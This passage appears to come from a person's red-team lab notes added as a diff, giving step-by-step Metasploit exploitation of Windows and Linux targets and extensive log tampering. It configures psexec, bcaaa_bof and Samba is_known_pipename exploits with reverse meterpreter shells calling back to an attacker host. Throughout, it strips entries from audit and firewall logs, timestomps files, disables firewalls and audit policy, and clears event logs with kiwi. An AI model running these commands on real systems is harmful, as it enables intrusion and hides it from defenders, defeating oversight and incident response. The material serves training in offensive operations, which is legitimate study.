+	exe=/bin/login - ocurring around same time 
+
+# search 1
+egrep "exe=\"/usr/sbin/sshd\"" /var/log/audit/audit.log
+	egrep "192.0.2.80" /var/log/audit/audit.log 
+egrep "exe=\"/bin/login\"" /var/log/audit/audit.log
+
+# search 2 
+ausearch -i | grep "07/21/2023" 
+ausearch -i | grep "192.0.2.80" 
+
+# confirm  
+egrep -v "192.0.2.80" /var/log/audit/audit.log > /tmp/a.clean
+egrep "192.0.2.80" /tmp/a.clean 
+# Clean
+cat /tmp/a.clean > /var/log/audit/audit.log
+
+# delete 
+rm /tmp/a.clean 
+
+# stomp 
+date -d "@lastentry"
+touch -t 202307212015.06 /var/log/audit/audit.log
+
+{ # feedback reference 
+
+grep 'exe="/usr/sbin/sshd"' /var/log/audit/audit.log | grep '192.0.2.80' 
+	or ausearch -i | grep "/usr/sbin/sshd"
+tail -n 150 /var/log/audit/audit.log | less
+# Look for any entries around your access that you might be responsible for, and note the audit IDs. You may need more than 150 lines of the log.
+cp /var/log/audit/audit.log /tmp/a.orig
+cd /tmp
+grep -vE "ID1|ID2|ID3|..." /tmp/a.orig > a.log
+grep 'exe="/usr/sbin/sshd"' a.log | grep '192.0.2.80' (Verify your entries are gone)
+cat /tmp/a.log > /var/log/audit/audit.log
+date -d @epoch time of last entry
+touch -t YYYYMMDDHHmm.ss /var/log/audit/audit.log
+ls -al /var/log/audit/audit.log (Make sure everything looks good)
+diff /tmp/a.orig /var/log/audit/audit.log (Final check that you cleaned exactly what you meant to)
+rm /tmp/a.orig /tmp/a.log (Point of no return...you have deleted your last copy of the original log)
+
+
+} 
+
+
+}
+
+# audit  reenable script { - start editing after disconnect and self delete 
+cd /tmp 
+
+echo -e '#!/bin/sh\nsleep 20\nfunction d {\nservice auditd start; rm -rf /tmp/X-unix\n}\ntrap d EXIT' > X-unix
+chmod 755 X-unix
+cat X-unix
+./X-unix&
+exit 
+	(exit off Target 1, 20 seconds!)
+
+}
+
+}
+
+#T2 { 
+~+C 
+-L4445:100.64.36.17:445
+-R8080:127.0.0.1:8080
+
+# reverse x64 meterpreter shell {
+use exploit/windows/smb/psexec 
+set payload windows/x64/meterpreter/reverse_tcp #64 bit payload
+set RHOSTS 127.0.0.1 
+set RPORT 4445 
+set SMBUser administrator
+set SMBPass keywest123!
+
+set LHOST 192.0.2.80
+set LPORT 8080
+}
+
+# survey 
+localtime 
+getuid 
+	SYSTEM
+getpid
+	3876
+sysinfo 
+	
+netstat 
+	3876/powershell.exe 
+ps
+	SYSTEM, 3876, 2023-07-22 03:32:58.400 EST
+
+
+# logs2clean
+MpCmdRun.log?
+dtctrace.log? 
+firewall.log 
+pfirewall.log 
+SAM. SECURITY.COMPONENTS.DEFAULT,SYSTEM,SOFTWARE 
+catroot2\edb.log
+Datastore\Logs\edb.log
+MpCmdRun.log 
+NTUSER.DAT.LOG1 
+setupapi.dev.log 
+PASSWD.LOG 
+setupactr.log\
+WindowsUpdate.log 
+
+# wary entries for this exploit 
+SYSTEM 
+- Powershell 7009
+- "Installation of services" SYSTEM 7045
+SECURITY 
+- Logons - 4624 4634 4672 4776 
+
+
+# event log check 
+upload /root/psloglist.exe c:/windows/temp/wsupdt.exe
+cd c:/windows/temp
+run multicommand -cl 'cmd /c wsupdt.exe -h /accepteula'
+
+run multicommand -cl 'cmd /c wsupdt.exe -i 7009 SYSTEM -m 14' # psexec related 
+run multicommand -cl 'cmd /c wsupdt.exe -i 7045 SYSTEM -m 14' # powershell related
+run multicommand -cl 'cmd /c wsupdt.exe -i 4624 SECURITY -m 14' # logon related 
+run multicommand -cl 'cmd /c wsupdt.exe -i 4634 SECURITY -m 14'
+run multicommand -cl 'cmd /c wsupdt.exe -i 4672 SECURITY -m 14'
+run multicommand -cl 'cmd /c wsupdt.exe -i 4776 SECURITY -m 14'
+
+run multicommand -cl 'cmd /c wsupdt.exe -m 20' # 20 minutes since logon 
+run multicommand -cl 'cmd /c wsupdt.exe SECURITY -m 20'
+run multicommand -cl 'cmd /c wsupdt.exe -m 25 "Windows Powershell"'
+
+run multicommand -cl 'cmd /c wsupdt.exe -m 20' # 20 minutes since logon 
+	run multicommand -cl 'cmd /c wsupdt.exe -m 30 EVENT'
+``` NOTE: Running ANY Sysinternals tool creates a REG KEY. DELETE after use ``` 
+reg enumkey -k "HKU\.Default\Software\Sysinternals" # if SYSTEM 
+reg enumkey -k "HKCU\.Default\Software\Sysinternals"" # if USER 
+*delete 
+
+
+# must clean 
+	CONSISTENT EVENT TIME: 07/22/2023 12:54:41  / 42 / 43 / 44 / 45 / 46 / 49 / 53
+- event 7342 - event ID 7009 
+- event 7341 - event ID 7045
+
+- security 5146 - ID 4624 
+- security 5151 - ID 4624 
+- security 5152 - ID 4672 
+- security 5153 - 4624 
+- 5154 - 4672 
+
+# firewall 
+cd %systemroot%/system32/LogFiles/Firewall			/pfirewall.log 
+run multicommand -cl 'cmd /c findstr "192.0.2.80" pfirewall.log'
+
+# pfirewall clean {
+run multicommand -cl 'cmd /c findstr /v /c:"192.0.2.80" %systemroot%\system32\LogFiles\Firewall\pfirewall.log > c:/windows/temp/sd102.tmp'
+
+#4. confirm string remove 
+cd c:/window/temp
+run multicommand -cl 'cmd /c findstr /c:"192.0.2.80" c:/windows/temp/sd102.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+type or cat .log file # if log is SMALL 
+	
+	# get LINE-COUNT 
+	run multicommand -cl 'cmd /c type sd102.tmp | find /c /v ""'
+	# display only last lines of file (starting at line +NUM) 
+	run multicommand -cl 'cmd /c more sd102.tmp +1035' # displays last 2 lines
+	2023-07-22 13:46:54 
+	
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd102.tmp c:/windows/system32/logfiles/firewall/pfirewall.log'
+
+#8. timestomp
+timestomp -m "07/22/2023 13:46:54" c:/windows/system32/logfiles/firewall/pfirewall.log
+
+# confirm clean
+run multicommand -cl 'cmd /c findstr  /c:"192.0.2.80" %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/pfirewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+
+}
+
+
+# firewall clean {
+
+# view logs, only want to clean on 05-24
+run multicommand -cl 'cmd /c findstr /c:"172.17.10.80" %systemroot%\system32\LogFiles\Firewall\firewall.log |findstr /c:"05-24" '
+
+run multicommand -cl 'cmd /c findstr /v /c:"172.17.10.80" %systemroot%\system32\LogFiles\Firewall\firewall.log |findstr /v /c:"05-24" > c:/windows/temp/sd102.tmp'
+
+#4. confirm string remove 
+cd c:/window/temp
+run multicommand -cl 'cmd /c findstr /c:"172.17.10.80" %systemroot%\system32\LogFiles\Firewall\firewall.log |findstr /c:"05-24" c:/windows/temp/sd102.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+type or cat .log file # if log is SMALL 
+	
+# get LINE-COUNT 
+run multicommand -cl 'cmd /c type sd102.tmp | find /c /v ""'
+# display only last lines of file (starting at line +NUM) 
+run multicommand -cl 'cmd /c more sd102.tmp +1624' # displays last 2 lines
+2018-05-21 11:19:10
+	
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd102.tmp c:/windows/system32/logfiles/firewall/firewall.log'
+
+#8. timestomp
+timestomp -m "05/21/2018 11:19:10" c:/windows/system32/logfiles/firewall/firewall.log
+
+# confirm clean
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/firewall.log
+run multicommand -cl 'cmd /c move sd102.tmp c:/windows/system32/logfiles/firewall/firewall.log'
+
+# check last entries 
+run multicommand -cl 'cmd /c type %systemroot%\system32\LogFiles\Firewall\firewall.log | find /c /v ""'
+run multicommand -cl 'cmd /c more %systemroot%\system32\LogFiles\Firewall\firewall.log +1620'
+
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+
+}
+
+
+# WER check {
+- windows vista + = .wer 
+	# TO "determine health and risk of target" = download and review dump files 
+run multicommand -cl "cmd.exe /c dir c:\\*.*dmp /S /A"
+
+}
+
+# application log check - MSSEC.EXE {
+run multicommand -cl 'cmd /c dir "c:\programdata\microsoft\microsoft antimalware\Scans\History\Service\" '
+run multicommand -cl 'cmd /c type "c:\programdata\microsoft\microsoft antimalware\Scans\History\Service\Detections.log" '
+
+- to make files readable once downloaded to nix host 
+dos2unix [file] 
+
+}
+
+
+# check for hanging processes, file residue 
+- hanging procs ran - stuff spawnd by your PID 
+	findstr.exe, cmd.exe, pslog.exe !!! # could be multiple instances of pslog.exe or findstr or cmd
+- uploaded pslog 
+	- del the sysinternal key 
+- turn firewall back on 
+}
+
+
+}
+
+# Exercise 2. More covering your tracks {
+Ops Box: 1337h4x.ops.local
+> Jump 1: web.drytortugas.lab (IP: 192.0.2.80), access via SSH port 22, Creds: www / Webific@ti0n
+>> Target 1: jenos.boot.lab (IP: 192.168.106.52), access via bcaaa_bof exploit using a reverse_tcp payload
+>> Target 2: gray.boot.lab (IP: 192.168.106.12), Linux Server, initial access via is_known_pipename exploit
+
+#J1 {
+ssh -x -v -p22 www@192.0.2.80 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L16102:192.168.106.52:16102 -R4444:127.0.0.1:4444 -R4445:127.0.0.1:4445
+Webific@ti0n
+
+// internal = 172.17.10.80
+
+#CLEANUP
+
+egrep "sshd\[8682\]|Jul 23 07:29:19" /var/log/secure
+egrep "11391|8682" /var/log/audit/audit.log
+
+
+}
+
+
+#T1 {
+
+use windows/misc/bcaaa_bof 
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 16102 (default)
+set LHOST 172.17.10.80 # internal IP 
+set LPORT 4444 (default)
+show options 
+
+# upgrade payload 
+run post/windows/manage/archmigrate SESSION=1 IGNORE_SYSTEM=true
+
+# basic survey 
+
+# backup session 
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=172.17.10.80 LPORT=4445 SESSION=1 HANDLER=true
+
+# survey 
+- C:\Program Files\Microsoft Security Client\msseces.exe 
+- C:\Program Files\Microsoft Security Client\MsMpEng.exe # microsoft malware protection engine (defender)
+-audit logs: account logon/logoff, priv use, domain logon
+
+- event logs 
+	- security logons 
+	- application (BCAA - 1001 1003 2207)
+
+- firweall incoming conn logged
+cd %systemroot%/system32/LogFiles/Firewall
+run multicommand -cl 'cmd /c type pfirewall.log' | less
+run multicommand -cl 'cmd /c findstr "172.17.10.80" pfirewall.log'
+
+FWLOG clean {
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"172.17.10.80" pfirewall.log > c:/windows/temp/sd102.tmp'
+#4. confirm string remove 
+cd c:/windows/temp
+run multicommand -cl 'cmd /c findstr /c:"172.17.10.80" c:/windows/temp/sd102.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+type or cat .log file # if log is SMALL 
+	
+	# get LINE-COUNT 
+	run multicommand -cl 'cmd /c type sd102.tmp | find /c /v ""'
+	# display only last lines of file (starting at line +NUM) 
+	run multicommand -cl 'cmd /c more sd102.tmp +16820' # displays last 2 lines
+
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd102.tmp c:/windows/system32/logfiles/firewall/pfirewall.log'
+
+#8. timestomp
+timestomp -m "07/23/2023 04:20:35" c:/windows/system32/logfiles/firewall/pfirewall.log
+
+#8.5 confirm clean
+run multicommand -cl 'cmd /c findstr  /c:"172.17.10.80" %systemroot%\system32\LogFiles\Firewall\pfirewall.log'
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/pfirewall.log
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+
+}
+
+FWLOG practice clean 2 - all entries contain the same IPs (cant clean easy, must fine tune) {
+# find 1. remove the entries related to the communications between IP 192.168.106.52 and IP/Port 172.16.0.5:443 that occurred on Dec 5th, 2018.
+run multicommand -cl 'cmd /c findstr "192.168.106.52" firewall.log |findstr /v "172.16.0.5"|findstr /v "443"|findstr /v "12-05" ' 
+# fine tune 
+run multicommand -cl 'cmd /c findstr /c:"2018-12-05 14:41:28" c:\windows\system32\LogFiles\Firewall\firewall.log'
+run multicommand -cl 'cmd /c findstr /c:"2018-12-05 14:41:56 ALLOW TCP" c:\windows\system32\LogFiles\Firewall\firewall.log'
+
+# find 2. also need to remove the entry related to the communications between IP 192.168.106.52 and IP/Port 139.226.10.20:443 that occurred on Dec 17th, 2018.
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.52" c:\windows\system32\LogFiles\Firewall\firewall.log |findstr /c:"139.226.10.20"'
+# fine tune 
+run multicommand -cl 'cmd /c findstr /c:"2018-12-17 14:38:50 ALLOW TCP 192.168.106.52" c:\windows\system32\LogFiles\Firewall\firewall.log '
+run multicommand -cl 'cmd /c findstr /c:"2018-12-17 14:38:51 ALLOW TCP 139.226" c:\windows\system32\LogFiles\Firewall\firewall.log '
+
+
+# removals
+run multicommand -cl 'cmd /c findstr /v /c:"2018-12-05 14:41:28" c:\windows\system32\LogFiles\Firewall\firewall.log > c:\windows\temp\sd102.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:"2018-12-05 14:41:56 ALLOW TCP" c:\windows\temp\sd102.tmp > c:\windows\temp\sd103.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:"2018-12-17 14:38:50 ALLOW TCP 192.168.106.52" c:\windows\temp\sd103.tmp > c:\windows\temp\sd104.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:"2018-12-17 14:38:51 ALLOW TCP 139.226" c:\windows\temp\sd104.tmp > c:\windows\temp\sd105.tmp'
+
+
+
+#4. confirm string remove 
+cd c:/window/temp
+run multicommand -cl 'cmd /c findstr "192.168.106.52" sd105.tmp |findstr "172.16.0.5"|findstr "443"|findstr "12-05" ' 
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.52" sd105.tmp |findstr /c:"139.226.10.20"' # shows other date, OK
+
+
+#5. Disable firewall - IOT overwrite pfirewall.log - otherwise generate LARGE GAPS in log
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+# check for logon.scr // *.scr 
+ps
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off'
+
+#6. find time of last log entry 
+	type or cat .log file # if log is SMALL 
+# get LINE-COUNT 
+run multicommand -cl 'cmd /c type sd105.tmp | find /c /v ""'
+# display only last lines of file (starting at line +NUM) 
+run multicommand -cl 'cmd /c more sd105.tmp +238' # displays last 2 lines
+2019-07-10 12 07 40
+	
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd105.tmp c:/windows/system32/logfiles/firewall/firewall.log'
+
+#8. timestomp
+timestomp -m "07/10/2019 12:07:40" c:/windows/system32/logfiles/firewall/firewall.log
+
+# confirm clean
+
+#8.6 verify time and file size 
+ls  %systemroot%/system32/LogFiles/Firewall/firewall.log
+run multicommand -cl 'cmd /c move sd102.tmp c:/windows/system32/logfiles/firewall/firewall.log'
+
+# check last entries 
+run multicommand -cl 'cmd /c type %systemroot%\system32\LogFiles\Firewall\firewall.log | find /c /v ""'
+run multicommand -cl 'cmd /c more %systemroot%\system32\LogFiles\Firewall\firewall.log +1620'
+
+
+#9. reenable firewall - before disconnect 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+
+}
+
+# REDISUAL CLEAN {
+- remove sysinternal key 
+- remove psloggedon 
+
+}
+
+}
+
+#T2 {
+~+C
+-L4446:192.168.106.12:445
+-L2502:192.168.106.12:22
+
+# exploit - linux/samba/is_known_pipe {
+use exploit linux/samba/is_known_pipename
+	- has built in bind shell, no need set payload 
+set RHOST 127.0.0.1 
+set RPORT 4446	
+	# fix bug: 
+		Exploit failed: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.
+set SMB::AlwaysEncrypt false	
+set SMB::ProtocolVersion 1
+show options 
+
+
+}
+
+cd /root
+cat README 
+	root: UpsideDowN
+	
+ssh -x -v -p2502 root@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+UpsideDowN
+
+#survey 
+logs SSH and 445 incoming
+
+
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -900 -type f -print0 | xargs -0 ls -latr 
+
+egrep -r "1092|172.17.10.80" /var/log
+
+kern.log 
+	"172.17.10.80"
+syslog - GREP MAY REQUIRE -a for BINARY FILE! 
+	"172.17.10.80"
+auth.log -a
+	"06:23:50 gray"
+
+
+# /var/log/log.1 clean {
+-rw-r----- syslog adm May 14  2021
+egrep "su\[2619\]" /var/log/log.1
+
+
+}
+
+}
+
+
+
+}
+
+# Exercise 3. Even More FML with a side of KMS {
+
+Ops Box: 1337h4x.ops.local
+> Jump 1: mail.fatdeer.lab (IP: 198.18.30.13), access via SSH port 22, Creds: remoteuser / remote
+>> Jump 2: web.drytortugas.lab (IP: 192.0.2.80 / 172.17.10.80), access via SSH port 22, Creds: www / Webific@ti0n
+>>> Target 1: ghostwheel.boot.lab (IP: 192.168.106.51), access via psexec exploit using a reverse_tcp payload, Port 8443. Creds: administrator / SunsetParade
+>>>> Target 2: fennec.boot.lab (IP: 192.168.106.10), x64 Linux Server, initial access via is_known_pipename exploit
+>>>> Target 3: BOOT Domain Controller, x64 Windows Server, access via psexec exploit using a reverse_tcp payload, Port 56875 and compromised admin creds.
+
+#J1 { 
+
+ssh -x -v -p22 remoteuser@198.18.30.13 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2222:192.0.2.80:22
+remote
+
+
+}
+
+#J2 { 
+ssh -x -v -p2222 www@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L4445:192.168.106.51:445 -R4444:127.0.0.1:4444 -R8080:127.0.0.1:8080
+Webific@ti0n
+
+/sbin/ip a - 172.17.10.80
+
+
+}
+
+#T1 { 
+
+# use exploit/windows/smb/psexec {
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 4445
+set LHOST 172.17.10.80 # internal J2 IP 
+set LPORT 4444
+set SMBPass SunsetParade
+set SMBUser administrator
+
+}
+
+# clear auditpol rules ( System Inegrity & Other System Event logs (noisy) ) {
+
+# create backup
+run multicommand -cl 'auditpol /backup /file:c:\windows\temp\MpSvcStub.log'
+
+# clear audit rules 
+run multicommand -cl 'auditpol /clear /y'
+
+# verify rules cleared 
+run multicommand -cl 'auditpol /get /category:*'
+
+# download backup of Rules
+download c:/windows/temp/MpSvcStub.log /tmp
+
+# delete copy off target
+del c:/windows/temp/MpSvcStub.log
+
+
+
+
+# upload
+upload /tmp/MpSvcStub.log
+
+# reenable  
+
+
+}
+
+# enum users before x64 
+run post/windows/gather/enum_logged_on_users 
+- bug in metasploit, will CRASH session with x64 payload in Windows 10. works fine with x32
+
+# migrate to 64bit 
+run post/windows/manage/archmigrate SESSION=1 IGNORE_SYSTEM=true
+
+# survey {
+#What is the date/time/ timezone on remote target?
+localtime
+#What is the IP and MAC address of remote target? 
+ipconfig
+#What is the hostname of the remote target? 
+sysinfo
+#What is the OS (include version, build, and service pack)? 
+sysinfo
+#What is the system architecture? 
+sysinfo
+#What is the system language? 
+sysinfo
+#What is the workgroup/domain? 
+sysinfo
+
+#Is auditing enabled or not? If so, what events are enabled? 
+run multicommand -cl 'cmd /c auditpol /get /category:*'
+
+
+#How much Total and Free physical memory is present on the target host?
+run multicommand -cl "systeminfo"
+#List the patches installed on the target. 
+run multicommand -cl "systeminfo"
+#List your backdoor connection information (remote IP and port, PID, UID and working directory) 
+getpid,getuid,pwd 
+	(and info from your opening session line)
+#What privileges are enabled for the UID you are running under? 
+run multicommand -cl 'whoami /priv'
+#How much Total and Free physical memory is present on the target host? 
+run multicommand -cl 'cmd /c systeminfo' 
+	(or post/windows/gather/wmic_command COMMAND="computersystem get TotalPhysicalMemory" and post/windows/gather/wmic_command COMMAND="OS get FreePhysicalMemory")
+#Which DNS server(s) does the host use? 
+run multicommand -cl 'netsh interface ip show config'
+#What is the primary gateway and netmask of the remote target? 
+route
+#Review the process list. Are there any network services running? If so, what are they? 
+ps 
+run post/windows/gather/enum_services
+#Are there any executables that appears to be malicious or security-related (list their corresponding PID and full path)? 
+ps
+netstat 
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"'. # if DC (dns) server
+
+	Review the list of network connections and sockets that are listening. Are any connections between the target and any other computers (not including your own connection)? Provide the connections PID, process name, local IP/port, and /remote IP/port netstat
+run post/windows/gather/wmic_command COMMAND='process get executablepath' 
+run post/windows/gather/wmic_command COMMAND='process get commandline | more' 
+
+- msascuil.exe - defender
+
+#List the names of logged-on users, how long they have been idle and which users have recently logged on. 
+run post/windows/gather/enum_logged_on_users
+idletime
+#List any services set to run at boot/login 
+run post/windows/gather/enum_services
+#List any scheduled tasks related to malware or security 
+run multicommand -cl 'schtasks /query'
+#List installed third-party (non-Microsoft) applications 
+run post/windows/gather/enum_applications
+#Are there any installed security products that are enabled? 
+run getcountermeasure 
+ps
+
+	- plus a review of the process list, startup programs, and installed programs and services
+#If there is a firewall present, what is it's status? 
+run multicommand -cl 'netsh advfirewall show currentprofile'
+#What is the value of %windir% (and other environment variables)?
+run post/multi/gather/env
+#List the drives that are present on the target host 
+show_mount
+#List the network shares on the target host 
+run multicommand -cl 'net share'
+#Review the relevant registry start up keys and values (HKLM and HKCU run and runonce keys for example) 
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\runonce'
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\run' # not all have these last 3
+reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\runonce' 
+reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
+
+#What user accounts are present on the system?
+run multicommand -cl 'net users'
+#What groups are present on the system and what users are members of the administrators group? 
+run multicommand -cl 'net localgroup'
+run multicommand -cl 'net localgroup administrators'
+#What is the account lockout policy? 
+run multicommand -cl 'net accounts'
+#Are there any event log entries related to your operations? 
+run multicommand -cl 'psloglist.exe # (any filters you want to use) [SYSTEM|SECURITY|APPLICATION]'
+	run multicommand -cl 'psloglist.exe -m 60 SYSTEM'
+	run multicommand -cl 'psloglist.exe -m 60 SECURITY'
+	run multicommand -cl 'psloglist.exe -m 60 APPLICATION'
+#Are there any files with a .doc(x), .xls(x), .ppt(x), or .pdf extension? If so, what directories are they primarily in? 
+search -f *.doc
+search -f *.xls
+search -f *.ppt
+search -f *.pdf
+#Are there any other log files related to your activities? If so, what is their full path and name? 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw'
+# Search TODAY'S logs 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "DD/MM/YYYY"'
+
+
+#Are there any error logs or dump files related to your activities? If so, what is their full path and name? 
+search -f *.wer 
+and then review corresponding log files if they have a mod/write time of when you were active on the host.)
+
+
+}
+
+# event logs (kiwi blast) {
+- can't remove with current toolset, dont want to blow away. should be aware of them (where/what)
+
+# wevtutil - check enabled
+run multicommand -cl 'wevtutil gl SYSTEM'
+run multicommand -cl 'wevtutil gl SECURITY'
+run multicommand -cl 'wevtutil gl APPLICATION'
+
+# review last few entries to see if logged ( last five entries (/c option), sorted newest to oldest (/rd:true) and placing the output into text (/f:text) )
+run multicommand -cl 'wevtutil qe SYSTEM /c:10 /rd:true /f:text'
+	big poewrshell exploit log, psexec above it
+run multicommand -cl 'wevtutil qe SECURITY /c:10 /rd:true /f:text'
+	auditpol removal completely logged
+run multicommand -cl 'wevtutil qe APPLICATION /c:10 /rd:true /f:text'
+		nothing
+		
+# query related SYSTEM/SEC/POWERSHELL IDs 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7045)]]" /rd:true /f:text' 
+
+run multicommand -cl 'wevtutil qe SECURITY "/q:*[System [(EventID=4776)]]" /rd:true /f:text'
+
+run multicommand -cl 'wevtutil qe "Windows Powershell" "/q:*[System [(EventID=400)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe "Windows Powershell" "/q:*[System [(EventID=403)]]" /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe "Windows Powershell" "/q:*[System [(EventID=600)]]" /rd:true /f:text' 
+
+- 7045 and Powershells == contains exploit == blow away 
+
+# kiwi_cmd - event cleaning  {
+
+load kiwi
+kiwi_cmd "privilege::debug"
+kiwi_cmd "event::drop"
+# Clear SECURITY
+kiwi_cmd "event::clear" 
+	# (this will clear the SECURITY log, and is the default setting)
+kiwi_cmd "event::clear /log:System" 
+
+# clear powershell 
+run event_manager -c "Windows PowerShell"
+
+# confirm clean 
+run event_manager -i
+
+}
+
+
+}
+
+# powershell artifacts {
+cd c:/windows/temp 
+dir 
+cd 20230724
+
+# download all (non-0) and review 
+download X
+
+# delete files containing exploit 
+del X 
+
+}
+
+# firewall - download rules {
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all status=enabled' -f T1-fwrules
+dos2unix T1-fwrules
+
+
+}
+
+# T2 portfwd setup (is_known_pipe exploit) + firewall rule to T2 {
+meterpreter >
+portfwd add -L 127.0.0.1 -l 4446 -r 192.168.106.10 -p 445
+portfwd add -R -L 127.0.0.1 -l 8260 -s 192.168.106.10 -p 8260
+
+run multicommand -cl 'netsh advfirewall firewall add rule name="gerogero" dir=in action=allow protocol=TCP remoteip=192.168.106.10'
+run multicommand -cl 'netsh advfirewall firewall add rule name="web" dir=in localport=8260 action=allow protocol=TCP'
+
+
+}
+
+
+```T1  cleanup ``` {
+
+# del fw rule 
+run multicommand -cl 'netsh advfirewall firewall del rule name="gerogero"'
+
+# T1-T2 exploit 
+portfwd del -L 127.0.0.1 -l 4446 -r 192.168.106.10 -p 445
+portfwd del -R -L 127.0.0.1 -l 1337 -p 1337
+
+#  T1-T2 ssh 
+portfwd del -L 127.0.0.1 -l 2223 -r 192.168.106.10 -p 2222
+
+
+# firewall cleaning {
+#1. determine: firewall running? is logging enabled? where logfile located? fw logging policy?
+run multicommand -cl 'netsh advfirewall show currentprofile'
+	pfirewall.log # default 
+ls c:/windows/system32/logfiles/firewall/pfirewall.log # GET ORIG. TIME
+	2023-07-25 04:13:01 
+cd c:/windows/system32/logfiles/firewall
+
+172.17.10.80
+192.168.106.10
+192.168.106.13
+
+#2. search for matching IP or ports, find discrete string (timestamp or unique IDs)
+//1 
+run multicommand -cl 'cmd /c findstr "172.17.10.80" pfirewall.log'
+//2
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.51 192.168.106.10" pfirewall.log'
+run multicommand -cl 'cmd /c findstr /c:" 1337" pfirewall.log'
+//3
+run multicommand -cl 'cmd /c findstr /c:"56875 0" pfirewall.log'
+
+	# !!! IP is sometimes too broad for /v removal (there are older entries with your IP) == search/clean with timestamp
+	run multicommand -cl 'cmd /c findstr /c:"2022-07-11 10:59" pfirewall.log"
+	
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"172.17.10.80" pfirewall.log > c:/windows/temp/sd102.tmp'
+
+cd c:/windows/temp 
+run multicommand -cl 'cmd /c findstr /v /c:"192.168.106.51 192.168.106.10" sd102.tmp > sd103.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:" 1337" sd103.tmp > sd104.tmp'
+run multicommand -cl 'cmd /c findstr /v /c:"56875 0" sd104.tmp > sd105.tmp'
+
+
+
+#4. confirm string remove 
+cd c:/windows/temp
+run multicommand -cl 'cmd /c findstr /c:"192.168.106.51 192.168.106.10" c:/windows/temp/sd105.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+	type or cat .log file # if log is SMALL 
+# get LINE-COUNT 
+run multicommand -cl 'cmd /c type sd105.tmp | find /c /v ""'
+# display only last lines of file (starting at line +NUM) 
+run multicommand -cl 'cmd /c more sd105.tmp +3146' # displays last 2 lines
+
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd105.tmp c:/windows/system32/logfiles/firewall/pfirewall.log'
+
+#8. timestomp
+timestomp -m "07/25/2023 04:23:06" c:/windows/system32/logfiles/firewall/pfirewall.log
+
+#8.5 confirm clean
